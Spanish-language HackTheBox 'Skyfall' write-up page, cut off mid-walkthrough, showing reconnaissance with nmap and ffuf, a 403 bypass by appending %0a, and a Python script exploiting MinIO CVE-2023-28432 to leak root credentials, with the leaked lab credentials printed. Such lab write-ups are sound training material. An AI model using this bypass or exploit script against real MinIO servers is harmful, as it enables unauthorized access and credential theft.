<!doctype html><html lang=es><head><title>HTB Skyfall WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Analysis' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Skyfall WriteUp"><meta name=twitter:description content="HackThebox 'Analysis' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/skyfall/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Skyfall WriteUp"><meta property="og:description" content="HackThebox 'Analysis' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-31T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-31T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Insane"><meta property="article:tag" content="Minio"><meta property="article:tag" content="Null Byte Injection"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/skyfall/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/skyfall/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/skyfall/>HTB Skyfall WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-31T00:00:00Z>31 agosto, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
24 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/insane/>Insane</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/minio/>Minio</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/null-byte-injection/>Null Byte Injection</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hashicorp-vault/>Hashicorp Vault</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/fuse/>Fuse</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/memfs/>Memfs</a></span></div></div></header><div class=post-content><h1 id=skyfall----hackthebox>Skyfall &ndash; HackTheBox
<a class=heading-link href=#skyfall----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty / Dificultad: <em>Insane</em> /<em>Insana</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Skyfall&rsquo; Avatar" src=/pentesting/images/Skyfall_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Skyfall&rdquo; es una m√°quina de categor√≠a Insana de la plataforma <code>HackTheBox</code>. La p√°gina est√° corriendo un servidor web el cual tiene un subdominio que podemos encontrar por buscando subdominios por <code>vhosting</code>. La nueva p√°gina muestra un servicio de muestra, del cual somos capaces de acceder como un usuario invitado. Una vez dentro, somos capaces de acceder a un directorio prohibido inyectando un &ldquo;null byte&rdquo;. Dentro de este directorio encontramos un servicio de <code>MinIO</code> vulnerable a <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-28432 class=external-link target=_blank rel=noopener>CVE-2023-28432</a>, el cual nos permite ver credenciales para <code>HashiCorp Value</code> en un endpoint expuesto. Con esto somos capaces de encontrar keys para <code>HashiCorp Value</code> y loguear por <code>SSH</code> como un usuario. Ya dentro, este usuario puede correr un programa para abrir values de <code>HashiCorp</code> con <code>sudo</code>. El programa permite crear un archivo de en modo <code>debug</code>. Para poder leer este archivo debug es que creamos una peque√±a montura en el sistema por medio de <code>libfuse</code> (<code>FUSE</code>), lo cual nos permite leer el archivo de <code>debug</code> y obtener credenciales como <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezando con un scan con <code>Nmap</code> s√≥lo muestra 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>80</code> <code>HTTP</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.254 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 18:31 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Skyfall - Introducing Sky Storage!
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
</span></span></span></code></pre></div><p>Visitando <code>http://10.10.11.254</code> muestra una simple p√°gina web:</p><p><img alt="Skyfall 1" src=/pentesting/images/Skyfall_1.png></p><p>Noto tambi√©n, de la p√°gina web, que √©sta indica un dominio: <code>skyfall.htb</code>. De manera que decido agregar este dominio a mi archivo <code>/etc/hosts</code> corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.254 skyfall.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb
</span></span></span></code></pre></div><p>La p√°gina en s√±i no muestra mucha informaci√≥n interesante fuera de promocionar un servicio para almacenar datos en la nube.</p><p>En este punto decido buscar por subdominios ya que el sitio web podr√≠a estar realizando <code>vhosting</code>. Para esto usamos la herramienta <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://skyfall.htb/ -H &#39;Host: FUZZ.skyfall.htb&#39; -fs 20631
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://skyfall.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 20631
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 608ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 246 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
</span></span></span></code></pre></div><p>De donde encontramos un dominio: <code>demo.skyfall.htb</code>. As√≠ que agrego este nuevo dominio a mi archivo <code>/etc/hosts</code> y ahora este archivo se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb
</span></span></span></code></pre></div><p>Visitando <code>http://demo.skyfall.htb</code> muestra un simple Demo de <code>Sky Storage</code> (el servicio descrito en la p√°gina principal).</p><p><img alt="Skyfall 2" src=/pentesting/images/Skyfall_2.png></p><p>Tal cual dice el sitio web, podemos utilizar las credenciales <code>guest:guest</code> para acceder a un servicio de demo. Una vez dentro, puedo ver un panel:</p><p><img alt="Skyfall 3" src=/pentesting/images/Skyfall_3.png></p><p>Luego de intentar muchas cosas, al lado izquierdo podemos ver la opci√≥n <code>MinIO Metrics</code>. Clickceando en esta opci√≥n redirige a <code>http://demo.skyfall.htb/metrics</code>, pero el sitio retorna <code>403 Forbidden</code> (acceso prohibido). Reviso si podemos bypassear y revisar esta p√°gina utilizando <code>ffuf</code>. Para ello extraigo mi cookie de la sesi√≥n <code>guest</code> (en <code>Firefox</code> es simplemente <code>Ctrl + Shift + I</code>, vamos a <code>Storage</code> y extraemos el valor de la cookie de <code>session</code>) y corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Fuzzing/URI-hex.txt:FUZZ -u http://demo.skyfall.htb/metricsFUZZ -b &#39;session=.eJw&lt;SNIP&gt;kM&#39; -fc 403
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://demo.skyfall.htb/metricsFUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/URI-hex.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Cookie: session=.eJw&lt;SNIP&gt;kM
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response status: 403
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>%</span>0a                     <span class=o>[</span>Status: 200, Size: 44883, Words: 4191, Lines: 9, Duration: 299ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=go>:: Progress: [256/256] :: Job [1/1] :: 122 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
</span></span></span></code></pre></div><p>donde <code>'session=.eJw&lt;SNIP>kM'</code> es la cookie (que he acortado porque es bastante extensa) de la sesi√≥n de usuario <code>guest</code>.</p><p>Aparentemente, agregar un <code>null byte</code> bypassea la restricci√≥n y nos deja acceder al sitio prohibido. Si visito <code>http://demo.skyfall.htb/metrics%0a</code> desde mi navegador de internet funciona y ahora podemos ver su contenido:</p><p><img alt=Skyfall src=/pentesting/images/Skyfall_4.png></p><p>De manera que estamos ante un servicio <code>MinIO</code>. Buscando por <code>What is MinIO</code> (<code>¬øqu√© es MinIO?</code>), basados en su <a href=https://min.io/ class=external-link target=_blank rel=noopener>p√°gina oficial</a>, tenemos:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>MinIO</code> is a high-performance, S3 compatible object store. It is built for large scale AI/ML, data lake and database workloads. It is software-defined and runs on any cloud or on-premises infrastructure. MinIO is dual-licensed under open source GNU AGPL v3 and a commercial enterprise license.</div></div><p>Es decir, es un servicio para administrar y guardar data en la nube.</p><p>Aparentemente, el servicio de datos que se ofrec√≠a en la p√°gina principal parece ser que usa <code>MinIO</code>.</p><p>Continuando con la inspecci√≥n, al final de la p√°gina puedo ver algo:</p><p><img alt="Skyfall 5" src=/pentesting/images/Skyfall_5.png></p><p>Veo que el servicio est√° llamando al dominio <code>prd23-s3-backend.skyfall.htb</code>.</p><p>Por ende, agrego este nuevo dominio a mi archivo <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb
</span></span></span></code></pre></div><p>Buscando por vulnerabilidades recientes para <code>MinIO</code>, somos capaces de encontrar la vulnerabilidad catalogada como <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-28432 class=external-link target=_blank rel=noopener>CVE-2023-28432</a>, tal cual se describe en <a href=https://github.com/acheiii/CVE-2023-28432 class=external-link target=_blank rel=noopener>este repositorio de Github</a>. En resumen, pueden haber algunas variables de entorno filtradas/leakeadas desde el endpoint <code>/minio/bootstrap/v1/verify</code>. Visitamos entonces <code>http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify</code>, interceptamos la petici√≥n con <code>Burpsuite</code> y cambiamos el m√©todo a <code>POST</code>:</p><p><img alt="Skyfall 6" src=/pentesting/images/Skyfall_6.png></p><p>o en un simple script de <code>Python</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_request</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>generic_headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.5&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br&#34;</span><span class=p>,</span> <span class=s2>&#34;Dnt&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Upgrade-Insecure-Requests&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Dest&#34;</span><span class=p>:</span> <span class=s2>&#34;document&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Mode&#34;</span><span class=p>:</span> <span class=s2>&#34;navigate&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Sec-Fetch-Site&#34;</span><span class=p>:</span> <span class=s2>&#34;none&#34;</span><span class=p>,</span> <span class=s2>&#34;Sec-Fetch-User&#34;</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;?1&#34;</span><span class=p>,</span> <span class=s2>&#34;Te&#34;</span><span class=p>:</span> <span class=s2>&#34;trailers&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Connection&#34;</span><span class=p>:</span> <span class=s2>&#34;close&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Making request to </span><span class=si>{</span><span class=n>url</span><span class=si>!r}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>generic_headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Invalid status code from response (HTTP code </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>!r}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_root_user</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_USER&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_root_password</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_PASSWORD&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>minio_secret_key</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MinioEnv&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;MINIO_ROOT_PASSWORD&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] MINIO_ROOT_USER: </span><span class=si>{</span><span class=n>minio_root_user</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] MINIO_ROOT_PASSWORD: </span><span class=si>{</span><span class=n>minio_root_password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;http://prd23-s3-backend.skyfall.htb:80/minio/bootstrap/v1/verify&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>make_request</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>Corriendo el script nos retorna unas credenciales:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 minio_leaked_data.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Making request to &#39;http://prd23-s3-backend.skyfall.htb:80/minio/bootstrap/v1/verify&#39;
</span></span></span><span class=line><span class=cl><span class=go>[+] MINIO_ROOT_USER: 5GrE1B2YGGyZzNHZaIww
</span></span></span><span class=line><span class=cl><span class=go>[+] MINIO_ROOT_PASSWORD: GkpjkmiVmpFuL2d3oRx0
</span></span></span></code></pre></div><p>De manera que tenemos un usuario y contrase√±a.</p><p>Intento usar estas credenciales en la p√°gina, pero no funcionan.</p><p>Luego de una breve investigaci√≥n, encuentro que existe el <a href=https://min.io/docs/minio/linux/reference/minio-mc.html class=external-link target=_blank rel=noopener>cliente de MinIO</a> (<code>MinIO</code> client). El cual nos permite interactuar con el servicio a trav√©s de consola.
Nos descargamos el binario para este servicio de <a href=https://dl.min.io/client/mc/release/linux-amd64/ class=external-link target=_blank rel=noopener>esta p√°gina</a> (descargando el binario <code>mc</code> para nuestra arquitectura de sistema operativo correspondiente) o descarg√°ndolo a trav√©s de consola con <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://dl.min.io/client/mc/release/linux-amd64/mc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-19 19:58:16--  https://dl.min.io/client/mc/release/linux-amd64/mc
</span></span></span><span class=line><span class=cl><span class=go>Resolving dl.min.io (dl.min.io)... 178.128.69.202, 138.68.11.125
</span></span></span><span class=line><span class=cl><span class=go>Connecting to dl.min.io (dl.min.io)|178.128.69.202|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 26771608 (26M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòmc‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mc                                         100%[=======================================================================================&gt;]  25.53M   857KB/s    in 30s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod +x ./mc
</span></span></span></code></pre></div><p>Revisando los comandos disponibles, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./mc -h
